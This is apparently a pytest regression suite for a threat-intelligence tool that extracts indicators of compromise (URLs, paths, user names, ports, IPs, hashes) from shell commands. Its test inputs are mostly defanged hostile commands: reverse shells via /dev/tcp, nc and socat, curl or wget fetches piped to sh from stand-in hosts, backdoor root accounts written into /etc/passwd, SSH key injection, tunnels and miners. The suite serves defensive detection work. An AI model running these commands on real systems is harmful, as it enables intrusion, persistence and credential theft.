"""Regression tests for the hardened IOC extractors: linear time, and no wrong or sensitive values as IOCs.

The inputs are defanged, as the extractors see them after the parse stage.
"""

import gc
import time
from typing import get_args

import pytest

from interlinear_cti.iocs import IOC_TYPES, extract, indicators
from interlinear_cti.model import IocType
from interlinear_cti.normalize import MAX_LINE, normalize_text

BS = chr(92)  # a backslash


def test_the_model_and_the_extractors_name_the_same_ioc_types():
    # model.IocType validates stored IOCs and iocs.IOC_TYPES drives extraction and the rules' iocs lists.
    assert get_args(IocType) == IOC_TYPES


def pairs(text, types):
    return [(i.type, i.value) for i in extract(text, types)]


def values(text, kind):
    return [i.value for i in extract(text, [kind])]


# Every kind runs in linear time on adversarial lines


def _fill(unit, n, head="", tail=""):
    body = n - len(head) - len(tail)
    return head + (unit * (body // len(unit) + 1))[:body] + tail


UNITS = ["a-", "a-a.", "a-a[.]", "-a", "a.", "a[.]", "a+", "a1-", "x-y-z ", "a+b-c.", "Ab_-", "hxxp:/", "hxxp://a,",
         ",a://", "a,", "(", ")", "/a", "/a[.]", "@/a", " ~/a", "$HOME/a", "${HOME}/", "C:" + BS + "a", "<blob ",
         "<truncated ", "<blob sha256=" + "a" * 64 + " len=1", "1[:]", "[", "[1:", "a" * 31 + ".", "a" * 63 + ":",
         "1.", "1.1.1[.]", "a:12", " -p 1", "--port=", "Port=", "useradd x ", "passwd ", "useradd -c ",
         'useradd -c "', "net user ", '"', "'", "ssh ", "ssh -p ", "ssh -L ", "ssh -L 1:[a:", "nc ", "nc -l ",
         "nmap -p 1,", "/dev/tcp/a/", "a[.]bc:1 ", "localhost:", "[::1]:", "1.1.1[.]1:", "-L=:1 ", "TCP-LISTEN:",
         "echo a:x:0: ", "1:", "$(", "$(a", "`", "$(x)", "$((", "${IFS}", "hxxp://a/)", "hxxp://a/]", "}", "]",
         "':1 ", " :1", "chisel R:1:", "R:1:", "ngrok tcp ", "a:x:0:\n", "<<E >> /etc/passwd\n", " /tmp",
         " C:" + BS + "a:", "'C:" + BS, "usermod -l a ", "openssl passwd ", ' "C:' + BS + "a b", '"C:' + BS + 'a b" ',
         "=C:" + BS + "a ", ">C:" + BS + "a ", 'echo "a:' + BS + 'n" ', "printf 'Y:" + BS + "tB' ", " # :1", "#",
         "ngrok tcp --a b ", "<<" + BS + "E\n"]
# Each builder makes one adversarial line of n characters: a unit repeated, the same after normalization (cut back
# to n), or a command followed by a long run of words.
BUILDERS = [lambda n, u=u: _fill(u, n) for u in UNITS] + [
    lambda n, u=u: normalize_text(_fill(u, n))[:n] for u in UNITS] + [
    lambda n: _fill("a ", n, head="useradd ", tail="-"), lambda n: _fill("useradd x ", n, tail=" -"),
    lambda n: _fill("passwd ", n, tail="-"), lambda n: _fill("-o x ", n, head="ssh "),
    lambda n: _fill("1 ", n, head="nc -l "), lambda n: _fill("a", n, head="hxxp://"),
    lambda n: _fill(")", n, head="hxxp://x/"), lambda n: _fill("a", n, head=" /"),
    lambda n: _fill("a", n, head=" C:" + BS), lambda n: _fill("x ", n - 53) + "<blob sha256=" + "a" * 40,
    lambda n: _fill("(", n, head="useradd -p $"), lambda n: _fill("a(b)", n, head="useradd -p $("),
    lambda n: _fill("]", n, head="hxxp://x/"), lambda n: _fill("}", n, head="hxxp://x/"),
    lambda n: _fill("(a)", n, head="hxxp://x/"),
    lambda n: _fill("a:x:0::/:/bin/sh\n", n, head="cat >> /etc/passwd <<E\n"),
    lambda n: _fill("R:1:a:2 ", n, head="chisel client "), lambda n: _fill("a ", n, head="ngrok tcp "),
    lambda n: _fill("x", n, head="sed '", tail=":1'")]
SMALL, LARGE = 1024, 4096
LINES = {n: [build(n) for build in BUILDERS] for n in (SMALL, LARGE)}


def _best_of_three(text, kind, reps=1):
    """Seconds per extract(text, [kind]), the best of three samples of reps runs each, with garbage collection off
    while timing, as timeit does."""
    best = float("inf")
    for _ in range(3):
        collecting = gc.isenabled()
        gc.disable()
        try:
            start = time.perf_counter()
            for _ in range(reps):
                extract(text, [kind])
            best = min(best, (time.perf_counter() - start) / reps)
        finally:
            if collecting:
                gc.enable()
    return best


@pytest.mark.parametrize("kind", IOC_TYPES)
def test_every_kind_scales_linearly_on_adversarial_lines(kind):
    # The slowest line for this kind at 4,096 characters must take less than 8 times as long as the same line at
    # 1,024: linear code takes about 4 times as long, quadratic code about 16 times. A ratio, unlike an absolute
    # bound, holds on a slow machine. The old patterns took 50 to 100 ms per line at this length.
    large = [_best_of_three(text, kind) for text in LINES[LARGE]]
    worst = max(range(len(large)), key=large.__getitem__)
    # Repeat a short line enough for each sample to last about 2 ms, the same number of times at both lengths.
    reps = max(1, min(50, int(0.002 / max(_best_of_three(LINES[SMALL][worst], kind), 1e-6))))
    small_time = _best_of_three(LINES[SMALL][worst], kind, reps)
    large_time = _best_of_three(LINES[LARGE][worst], kind, reps)
    line = LINES[LARGE][worst][:30]
    assert large_time < 0.200, (line, large_time)  # a sanity ceiling only
    assert large_time < 8 * small_time, (line, small_time, large_time)


# Only the generated placeholders are removed


def test_attacker_written_placeholder_text_hides_nothing():
    assert pairs("echo '<blob ' | curl hxxp://evil.example[.]com/x > /tmp/out.txt", ["url", "path"]) == [
        ("url", "hxxp://evil.example[.]com/x"), ("path", "/tmp/out.txt")]
    assert pairs("printf '<blob x' ; wget hxxp://203.0.113[.]5/a", ["url", "ipv4"]) == [
        ("url", "hxxp://203.0.113[.]5/a"), ("ipv4", "203.0.113[.]5")]
    assert pairs("curl hxxp://evil.example[.]com/x -o /tmp/<truncated a>", ["url"]) == [
        ("url", "hxxp://evil.example[.]com/x")]
    assert pairs("echo '<truncated ' ; ping 203.0.113[.]5", ["ipv4"]) == [("ipv4", "203.0.113[.]5")]


def test_generated_placeholders_are_removed():
    digest = "ab" * 32
    assert pairs(f"echo <blob sha256={digest} len=300> <truncated len=5000 sha256={digest}>", list(IOC_TYPES)) == []


def test_a_blob_marker_cut_by_the_truncation_is_removed():
    marker = " <truncated len=9000 sha256=" + "c" * 64 + ">"
    for cut in ("<blob", "<blob ", "<blob sha2", "<blob sha256=" + "a" * 40, "<blob sha256=" + "a" * 64,
                "<blob sha256=" + "a" * 64 + " ", "<blob sha256=" + "a" * 64 + " len=12"):
        assert pairs("echo x " + cut + marker, list(IOC_TYPES)) == [], cut
    # The same text earlier in the line, or attacker text in the same place, is not a cut marker.
    assert values("echo <blob sha256=" + "a" * 40 + " x" + marker, "hash") == ["a" * 40]
    assert values("echo <blob hxxp://evil.example[.]com/x" + marker, "url") == ["hxxp://evil.example[.]com/x"]


def test_truncation_at_any_offset_of_a_blob_marker_leaks_nothing():
    blob = "QUJD" * 60
    for pad in range(MAX_LINE - 120, MAX_LINE + 5):
        text = normalize_text("x " * (pad // 2) + ("y" if pad % 2 else "") + blob + " tail")
        assert pairs(text, list(IOC_TYPES)) == [], text[-140:]


# A hash is a whole token


def test_a_hex_run_inside_a_longer_token_is_not_a_hash():
    md5 = "d41d8cd98f00b204e9800998ecf8427e"
    sha1 = "da39a3ee5e6b4b0d3255bfef95601890afd80709"
    assert values("echo " + "deadbeef" * 8 + "Z", "hash") == []
    assert values("export TOKEN=abcdef0123456789abcdef0123456789xyz", "hash") == []
    assert values("echo key_" + md5, "hash") == []
    assert values("echo x" + md5, "hash") == []
    assert values("echo " + md5 + "_x", "hash") == []
    assert values("echo md5=" + md5, "hash") == [md5]
    assert values("sha1sum x # " + sha1, "hash") == [sha1]


# URL ends


def test_url_ends():
    url = "hxxp://evil.example[.]com/a"
    assert values("echo `curl " + url + "`", "url") == [url]
    for punct in ".,;:!?":
        assert values(f"see {url}{punct} next", "url") == [url], punct
    assert values(f"(see {url})", "url") == [url]
    assert values(f"x=$(curl {url})", "url") == [url]
    assert values(f"$(curl {url})&&id", "url") == [url]
    assert values(f"see {url}).", "url") == [url]
    wiki = "hxxps://en.example[.]org/wiki/Foo_(bar)"
    assert values(f"open {wiki}", "url") == [wiki]
    assert values(f"(open {wiki}).", "url") == [wiki]
    assert values("curl hxxp:// x; curl hxxp://.", "url") == []


def test_comma_separated_urls_are_separate():
    assert values("a,hxxp://x.example[.]com,hxxp://y.example[.]com", "url") == [
        "hxxp://x.example[.]com", "hxxp://y.example[.]com"]
    assert values("curl hxxp://evil.example[.]com/a,hxxp://evil2.example[.]com/b", "url") == [
        "hxxp://evil.example[.]com/a", "hxxp://evil2.example[.]com/b"]
    assert values("curl 'hxxp://evil.example[.]com/?a=1,2'", "url") == ["hxxp://evil.example[.]com/?a=1,2"]


def test_url_schemes_still_match():
    assert values("git clone git+ssh://git@code.example[.]io/repo.git", "url") == [
        "git+ssh://git@code.example[.]io/repo.git"]
    assert values("aws s3 cp s3://bucket-name/key.txt .", "url") == ["s3://bucket-name/key.txt"]
    assert values("curl hxxps://evil.example[.]com:8443/a/b.sh?x=1#f", "url") == [
        "hxxps://evil.example[.]com:8443/a/b.sh?x=1#f"]


# Case-insensitive duplicates for domains and hashes only


def test_domains_and_hashes_dedupe_case_insensitively():
    assert values("ping EVIL.example[.]com; ping evil.example[.]com", "domain") == ["EVIL.example[.]com"]
    md5 = "d41d8cd98f00b204e9800998ecf8427e"
    assert values(f"echo {md5.upper()} {md5}", "hash") == [md5.upper()]


def test_urls_and_paths_stay_case_sensitive():
    assert values("curl hxxp://x.example[.]com/A hxxp://x.example[.]com/a", "url") == [
        "hxxp://x.example[.]com/A", "hxxp://x.example[.]com/a"]
    assert values("cat /tmp/A.sh /tmp/a.sh", "path") == ["/tmp/A.sh", "/tmp/a.sh"]


# A documented limitation


def test_an_option_letter_glued_to_a_domain_stays_on_it():
    assert normalize_text("mysql -hdb.example.com") == "mysql -hdb.example[.]com"
    assert values("mysql -hdb.example[.]com", "domain") == ["hdb.example[.]com"]


# Paths


def test_path_segments_may_be_defanged():
    assert values("bash -i >& /dev/tcp/203.0.113[.]5/4444 0>&1", "path") == ["/dev/tcp/203.0.113[.]5/4444"]
    assert values("cat /tmp/203.0.113[.]5.log", "path") == ["/tmp/203.0.113[.]5.log"]
    assert values("ls /var/www/evil.example[.]com/index.php", "path") == ["/var/www/evil.example[.]com/index.php"]


def test_home_relative_paths_are_kept_as_written():
    assert values("cat ~/x", "path") == ["~/x"]
    assert values("echo key >> $HOME/.ssh/authorized_keys", "path") == ["$HOME/.ssh/authorized_keys"]
    assert values("echo key >> ${HOME}/.ssh/authorized_keys", "path") == ["${HOME}/.ssh/authorized_keys"]


def test_windows_switches_are_not_paths():
    assert values("net user backdoor P@ss /add", "path") == []
    assert values("cmd /c dir /s /q", "path") == []
    assert values("bash /x.sh; cat /etc/shadow", "path") == ["/x.sh", "/etc/shadow"]
    assert values("rm -f /tmp/x.sh 2>/dev/null", "path") == ["/tmp/x.sh", "/dev/null"]


def test_windows_drive_paths():
    assert values(r"del /f /q C:\Users\Public\x.exe", "path") == [r"C:\Users\Public\x.exe"]
    assert values(r"rd /s /q C:\temp", "path") == [r"C:\temp"]
    assert values(r'type "C:\Users\bob\AppData\x.ps1"', "path") == [r"C:\Users\bob\AppData\x.ps1"]
    assert values(r"Remove-Item -Force C:\Windows\Temp\a.ps1", "path") == [r"C:\Windows\Temp\a.ps1"]


# Users


@pytest.mark.parametrize("text, expected", [
    ("useradd sysadm -p secret", ["sysadm"]),
    ("adduser bob sudo", ["bob"]),
    ("useradd -m bob # backdoor", ["bob"]),
    ("useradd -m -s /bin/bash sysadm 2>/dev/null", ["sysadm"]),
    ("useradd -m sysadm >/dev/null 2>&1", ["sysadm"]),
    ("echo 'hacker:x:0:0::/root:/bin/bash' >> /etc/passwd", ["hacker"]),
    ('echo "toor::0:0::/root:/bin/sh" | sudo tee -a /etc/passwd', ["toor"]),
    ("printf 'svc:x:0:0::/root:/bin/sh' >> /etc/passwd", ["svc"]),
    ("sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash backdoor", ["backdoor"]),
    ("useradd -m bob\nEOF", ["bob"]),
    ("useradd -p secret", []),
    ("useradd -c 'passwd eve' alice", ["alice"]),
    ("usermod -aG sudo bob", ["bob"]),
    ("usermod -G sudo -a bob", ["bob"]),
    ("adduser --home /home/x --shell /bin/bash bob", ["bob"]),
    ("adduser --gecos=Bob --ingroup sudo bob", ["bob"]),
    ("passwd bob", ["bob"]),
    ("echo 'x' | passwd --stdin bob", ["bob"]),
    ("/usr/sbin/useradd -m eve", ["eve"]),
    ("sh -c 'useradd -m eve'", ["eve"]),
    ("useradd -m \"eve\"", ["eve"]),
    ("cat /etc/passwd | grep bash", []),
    ("cp /etc/passwd passwd.bak", []),
    ("echo 'hacker:x:0:0::/root:/bin/bash'", []),
    ("net user backdoor P@ss /add", ["backdoor"]),
    ('net user "John Smith" P@ss /add', ["John Smith"]),
    ("NET USER admin2 Passw0rd! /ADD", ["admin2"]),
    ("net user /domain", []),
    ("net user", []),
])
def test_users(text, expected):
    assert values(text, "user") == expected


# Ports


@pytest.mark.parametrize("text, expected", [
    ("sshpass -p 12345 ssh root@203.0.113[.]5", []),
    ("ps -p 1234", []),
    ("mysql -u root -p 3306", []),
    ("docker run -p 8080:80 img", []),
    ("chown 1000:1000 /home/bob", []),
    ("time 10:30:45", []),
    ("echo started at 10:30 /tmp/x", []),
    ("ssh -p 99999 h", []),
    ("ssh -p 0 h", []),
    ("ssh root@203.0.113[.]5 ps -p 1234", []),
    ("curl hxxp://admin:12345@198.51.100[.]7:8080/cgi-bin/x", ["8080"]),
    ("ssh -p 2222 root@203.0.113[.]5", ["2222"]),
    ("ssh -p2222 root@203.0.113[.]5", ["2222"]),
    ("ssh root@203.0.113[.]5 -p 2222", ["2222"]),
    ("ssh -P 2222 root@203.0.113[.]5", []),
    ("ssh -P work -p 2222 root@203.0.113[.]5", ["2222"]),
    ("ssh -o Port=2222 root@evil.example[.]com", ["2222"]),
    ("ssh -oPort=2222 root@evil.example[.]com", ["2222"]),
    ("ssh -o 'Port 2222' root@evil.example[.]com", ["2222"]),
    ("ssh -R 8080:localhost:80 root@203.0.113[.]5", ["8080", "80"]),
    ("ssh -D 1080 -N root@203.0.113[.]5", ["1080"]),
    ("ssh -L 3306:127.0.0[.]1:3306 root@203.0.113[.]5", ["3306"]),
    ("ssh -NfL 0.0.0[.]0:8080:[::1]:80 root@203.0.113[.]5", ["8080", "80"]),
    ("scp -P 2222 f root@203.0.113[.]5:/tmp", ["2222"]),
    ("scp -rP 2222 dir root@203.0.113[.]5:/tmp", ["2222"]),
    ("scp -p f root@203.0.113[.]5:/tmp", []),
    ("sftp -P 2222 root@203.0.113[.]5", ["2222"]),
    ("nc -lvnp 4444", ["4444"]),
    ("nc -l -p 4444", ["4444"]),
    ("nc -l 4444", ["4444"]),
    ("nc 203.0.113[.]5 4444 -e /bin/sh", ["4444"]),
    ("nc -w 3 203.0.113[.]5 4444", ["4444"]),
    ("ncat -6 2001[:]db8[:]0[:]0[:]0[:]0[:]0[:]1 4444", ["4444"]),
    ("nc -zv 203.0.113[.]5 20-25", ["20-25"]),
    ("nmap -p 22,80,443 198.51.100[.]0/24", ["22", "80", "443"]),
    ("nmap -p1-1024,U:53 198.51.100[.]5", ["1-1024", "53"]),
    ("nmap -p- 198.51.100[.]5", []),
    ("nmap -p 0,70000,22 198.51.100[.]5", ["22"]),
    ("masscan -p80,443 198.51.100[.]0/24", ["80", "443"]),
    ("rustscan -a 198.51.100[.]5 -p 22,80", ["22", "80"]),
    ("bash -i >& /dev/tcp/203.0.113[.]5/4444 0>&1", ["4444"]),
    ("cat < /dev/udp/203.0.113[.]5/53", ["53"]),
    ("xmrig --url=pool.example[.]com:443 --port 3333", ["443", "3333"]),
    ("tool --port=8443", ["8443"]),
    ("export Port=5555", ["5555"]),
    ("gost -L=:8080", ["8080"]),
    ("gost -L=socks5://:1080", ["1080"]),
    ("gost -L=tcp://:2222/203.0.113[.]5:22", ["2222", "22"]),
    ("socat TCP-LISTEN:4444,fork EXEC:/bin/bash", ["4444"]),
    ("chisel client 203.0.113[.]5:8000 R:socks", ["8000"]),
    ("ip=203.0.113[.]5:8080", ["8080"]),
    ("curl hxxp://[2001:db8::1]:8080/x", ["8080"]),
    ("curl hxxp://localhost:3000/x", ["3000"]),
    ("./xmrig -o stratum+tcp://pool.example[.]com:4444", ["4444"]),
])
def test_ports(text, expected):
    assert values(text, "port") == expected


# These inputs are raw, and go through normalize_text first, as in the parse stage.


def raw_values(raw, kind):
    return values(normalize_text(raw), kind)


@pytest.mark.parametrize("raw, expected", [
    ("useradd -m -p $(openssl passwd -1 Secr3t) hacker", ["hacker"]),
    ("useradd -m -p `openssl passwd -1 Secr3t` hacker", ["hacker"]),
    ("usermod -p $(openssl passwd -1 x) root", ["root"]),
    ('echo "hacker:$(openssl passwd -1 Secr3t):0:0::/root:/bin/bash" >> /etc/passwd', ["hacker"]),
    ("useradd -p $(mkpasswd -m sha-512 Secr3t) hacker", ["hacker"]),
    ('useradd -m -p "$(openssl passwd -1 Secr3t)" hacker', ["hacker"]),
    ("useradd -p $(perl -e 'print crypt(\"x\",\"aa\")') hacker", ["hacker"]),
    ("useradd -G sudo -p $(echo Secr3t | openssl passwd -1 -stdin) -m hacker", ["hacker"]),
    ("echo -e 'Secr3t" + BS + "nSecr3t' | passwd hacker", ["hacker"]),
    ("openssl passwd -1 Secr3t", []),
    ("x=$(openssl passwd -6 Secr3t); useradd -p $x hacker", ["hacker"]),
    ("echo `useradd -m eve`", ["eve"]),
])
def test_a_password_in_a_command_substitution_is_never_the_user(raw, expected):
    assert raw_values(raw, "user") == expected


@pytest.mark.parametrize("raw, expected", [
    ("cat >> /etc/passwd <<EOF\nbackd:x:0:0::/:/bin/sh\nEOF", ["backd"]),
    ("cat <<'EOF' >> /etc/passwd\nbackd:x:0:0::/:/bin/sh\nsvc::0:0::/:/bin/sh\nEOF", ["backd", "svc"]),
    ("tee -a /etc/passwd <<-EOF\n\tbackd:x:0:0::/:/bin/sh\n\tEOF", ["backd"]),
    ("cat >> /etc/passwd <<EOF\nEOF\nbackd:x:0:0::/:/bin/sh", []),
    ("cat <<EOF > /tmp/x\nbackd:x:0:0::/:/bin/sh\nEOF", []),
    ("usermod -l newname oldname", ["newname", "oldname"]),
    ("usermod --login=newname -aG sudo oldname", ["newname", "oldname"]),
])
def test_more_user_forms(raw, expected):
    assert raw_values(raw, "user") == expected


@pytest.mark.parametrize("raw, expected", [
    ("$(curl${IFS}http://a.example.com/x)&&$(curl${IFS}http://b.example.com/y)",
     ["hxxp://a.example[.]com/x", "hxxp://b.example[.]com/y"]),
    ("curl http://a.example.com/x)http://b.example.com/y", ["hxxp://a.example[.]com/x", "hxxp://b.example[.]com/y"]),
    ("(curl http://a.example.com/x),(curl http://b.example.com/y)",
     ["hxxp://a.example[.]com/x", "hxxp://b.example[.]com/y"]),
    ("[link](http://a.example.com/x)", ["hxxp://a.example[.]com/x"]),
    ("curl http://en.wikipedia.org/wiki/Foo_(bar)", ["hxxp://en.wikipedia[.]org/wiki/Foo_(bar)"]),
    ("wget${IFS}http://203.0.113.5/a.sh${IFS}-O-|sh", ["hxxp://203.0.113[.]5/a.sh"]),
    ("wget http://203.0.113.5/a.sh$IFS-O-", ["hxxp://203.0.113[.]5/a.sh"]),
    ("{curl,http://a.example.com/x}|{sh,}", ["hxxp://a.example[.]com/x"]),
    ("bash -c {wget,http://203.0.113.5/a}", ["hxxp://203.0.113[.]5/a"]),
    ("curl [http://a.example.com/x]", ["hxxp://a.example[.]com/x"]),
    ("curl http://a.example.com/x?a=${b}", ["hxxp://a.example[.]com/x?a=${b}"]),
])
def test_url_parentheses_and_tails(raw, expected):
    assert raw_values(raw, "url") == expected


@pytest.mark.parametrize("raw, expected", [
    ("rm -rf /tmp/*", ["/tmp"]),
    ("rm -rf /root", ["/root"]),
    ("cd /var; ls /dev /proc /home", ["/var", "/dev", "/proc", "/home"]),
    ("cmd /c dir /s /q /add", []),
    ("awk -F:" + BS + "t '{print}' f", []),
    ("sed 's:" + BS + "(a" + BS + "):b:' f", []),
    ("copy " + BS * 2 + "server" + BS + "share" + BS + "x.exe C:" + BS + "x.exe", ["C:" + BS + "x.exe"]),
    ("C:" + BS + "Windows" + BS + "x.exe /c", ["C:" + BS + "Windows" + BS + "x.exe"]),
    ("type 'C:" + BS + "x.txt'", ["C:" + BS + "x.txt"]),
    ("out=C:" + BS + "x.txt", ["C:" + BS + "x.txt"]),  # a drive path after "=" counts since the follow-ups
])
def test_root_paths_and_drive_path_starts(raw, expected):
    assert raw_values(raw, "path") == expected


@pytest.mark.parametrize("raw, expected", [
    ("./chisel server -p 8000 --reverse", ["8000"]),
    ("./chisel client 203.0.113.5:8000 R:1080:socks", ["8000", "1080"]),
    ("chisel client 203.0.113.5:8000 R:2222:localhost:22 L:3000:10.0.0.5:80/tcp", ["8000", "2222", "22", "3000", "80"]),
    ("chisel client 203.0.113.5:8000 R:socks", ["8000"]),
    ("ngrok tcp 4444", ["4444"]),
    ("ngrok http 8080 --region us", ["8080"]),
    ("ngrok tcp 127.0.0.1:22", ["22"]),
    ("grep ':22 ' /etc/services", []),
    ("sed -n ':1' f", []),
    ('grep " :22" f', []),
    ("gost -L :8080", ["8080"]),
])
def test_tunnel_ports_and_quoted_listeners(raw, expected):
    assert raw_values(raw, "port") == expected


# Confirmation follow-ups. Attack-like strings are built from fragments.

PASSWD_FILE = "/etc/" + "passwd"
RECORD = "bd" + ":x:0:0::/:/bin/sh"
DRIVE = "C:" + BS


@pytest.mark.parametrize("raw, expected", [
    ("ngrok http --basic-auth admin:" + "12345 8080", ["8080"]),
    # 20000 comes from the generic host:port rule (the tunnel's public address); ngrok's own port is 22.
    ("ngrok tcp --remote-addr 1.tcp.ngrok.io:20000 22", ["20000", "22"]),
    ("ngrok tcp --region eu 22", ["22"]),
    ("ngrok tcp 22 --region eu", ["22"]),
    ("ngrok http --domain=x.example.com 8080", ["8080"]),
    ("socat - TCP:203.0.113.5:4444 # don't :80", ["4444"]),
    ("gost -L :8080 # then :9090", ["8080"]),
    ("x=a#b gost -L :8080", ["8080"]),
    ("echo '# not a comment' && gost -L :8080", ["8080"]),
    # A Windows path before the command: the backslash starts the command word, as / does.
    (DRIVE + "Users" + BS + "Public" + BS + "n" + "c.exe -e cmd.exe 203.0.113.5 4444", ["4444"]),
])
def test_followup_ports(raw, expected):
    assert raw_values(raw, "port") == expected


# IPv4 octets as normalize defangs them: 1 to 4 digits, each 255 or less, so leading zeros are fine and a version
# string is not an address.
@pytest.mark.parametrize("raw, expected", [
    ("ping 0203.0.113.5", ["0203.0.113[.]5"]),
    ("ping 203.000.0113.0005", ["203.000.0113[.]0005"]),
    ("nc 203.0.113.05 4444", ["203.0.113[.]05"]),
    ("ping 0255.0.0.0255", ["0255.0.0[.]0255"]),
    ("pip install x==1.2.3.1234", []),
    ("echo 2026.10.18.1", []),
    ("ping 0256.0.0.1", []),
])
def test_ipv4_octets_with_leading_zeros(raw, expected):
    assert raw_values(raw, "ipv4") == expected


@pytest.mark.parametrize("text", ["1.2.3[.]1234", "2026.10.18[.]1", "0256.0.0[.]1", "1.2.3[.]00255"])
def test_an_already_defanged_version_string_is_not_an_ipv4(text):
    assert values(text, "ipv4") == []


# normalize defangs a bracketed IPv6 host as [2001[:]db8[:][:]1]; the host, its port and the URL all come out.
@pytest.mark.parametrize("raw, expected", [
    ("curl hxxp://[2001:db8::1]:8080/x",
     [("url", "hxxp://[2001[:]db8[:][:]1]:8080/x"), ("ipv6", "2001[:]db8[:][:]1"), ("port", "8080")]),
    ("curl http://[2001:db8::1]/x", [("url", "hxxp://[2001[:]db8[:][:]1]/x"), ("ipv6", "2001[:]db8[:][:]1")]),
    ("nc -lvp 4444 [2001:db8::7]:4444", [("ipv6", "2001[:]db8[:][:]7"), ("port", "4444")]),
    ("ssh -p 2222 [::1]:22", [("ipv6", "[:][:]1"), ("port", "2222"), ("port", "22")]),
])
def test_a_defanged_bracketed_ipv6_keeps_its_port(raw, expected):
    found = [(i.type, i.value) for i in extract(normalize_text(raw), ["url", "ipv6", "port"])]
    assert found == expected


@pytest.mark.parametrize("raw, expected", [
    ('rm -rf "' + DRIVE + "Program Files" + BS + "Evil" + BS + 'x.exe"',
     [DRIVE + "Program Files" + BS + "Evil" + BS + "x.exe"]),
    ("Remove-Item -Recurse '" + DRIVE + "Users" + BS + "Public" + BS + "my dir'",
     [DRIVE + "Users" + BS + "Public" + BS + "my dir"]),
    ('copy x.exe --dest="' + DRIVE + "a b" + BS + 'x.exe"', [DRIVE + "a b" + BS + "x.exe"]),
    ('printf "a:' + BS + 'n" > /tmp/x', ["/tmp/x"]),
    ("echo -e 'Y:" + BS + "tB' >> /etc/crontab", ["/etc/crontab"]),
    ('echo "' + DRIVE + "temp" + BS + 'x.exe" > list.txt', [DRIVE + "temp" + BS + "x.exe"]),
    ("type " + DRIVE + "temp", [DRIVE + "temp"]),
    ("--out=" + DRIVE + "x.exe", [DRIVE + "x.exe"]),
    ("rm -f >" + DRIVE + "x.txt", [DRIVE + "x.txt"]),
    ("copy x.exe " + DRIVE + "x.exe:hidden.exe", []),
    ('type "' + DRIVE + 'x.txt:stream"', []),
])
def test_followup_drive_paths(raw, expected):
    assert raw_values(raw, "path") == expected


@pytest.mark.parametrize("raw, expected", [
    ("cat >> " + PASSWD_FILE + " <<" + BS + "EOF\n" + RECORD + "\nEOF", ["bd"]),
    ("cat >> " + PASSWD_FILE + " <<-" + BS + "EOF\n\t" + RECORD + "\n\tEOF", ["bd"]),
    ("cat > /tmp/x <<" + BS + "EOF\n" + RECORD + "\nEOF", []),
])
def test_followup_backslash_heredoc(raw, expected):
    assert raw_values(raw, "user") == expected


# A command run by its system path (/usr/bin/wget, /bin/rm) names the tool, not an indicator, so glosses leave that
# path out; paths in arguments stay, and so does a dropped tool's own path, such as /tmp/.x/run, which is one.
SHADOW_FILE = "/etc/sha" + "dow"


@pytest.mark.parametrize("text, expected", [
    ("/usr/bin/wg" + "et hxxp://203.0.113[.]5/x", []),
    ("/bin/cat " + SHADOW_FILE, [SHADOW_FILE]),
    ("sudo -u root /bin/rm -rf /tmp/.x", ["/tmp/.x"]),
    ("nohup /usr/local/bin/agent -c /etc/agent.conf &", ["/etc/agent.conf"]),
    ("timeout -s 9 10 /usr/sbin/tcpdump -w /tmp/c.pcap", ["/tmp/c.pcap"]),
    ("env A=1 /usr/bin/python3 /tmp/x.py", ["/tmp/x.py"]),
    ("echo a | /usr/bin/tee /tmp/y", ["/tmp/y"]),
    ("cd /tmp\n/bin/ls /root", ["/tmp", "/root"]),
    ("cat /bin/cat", ["/bin/cat"]),
    ("/tmp/.x/run -c /tmp/.x/c", ["/tmp/.x/run", "/tmp/.x/c"]),
    ('"/usr/bin/wg' + 'et" -q hxxp://203.0.113[.]5/x -O /tmp/x', ["/tmp/x"]),
])
def test_command_paths_are_not_indicators(text, expected):
    assert [i.value for i in indicators(text, ["path"])] == expected


def test_extract_still_reports_command_paths():
    assert values("/bin/cat " + SHADOW_FILE, "path") == ["/bin/cat", SHADOW_FILE]
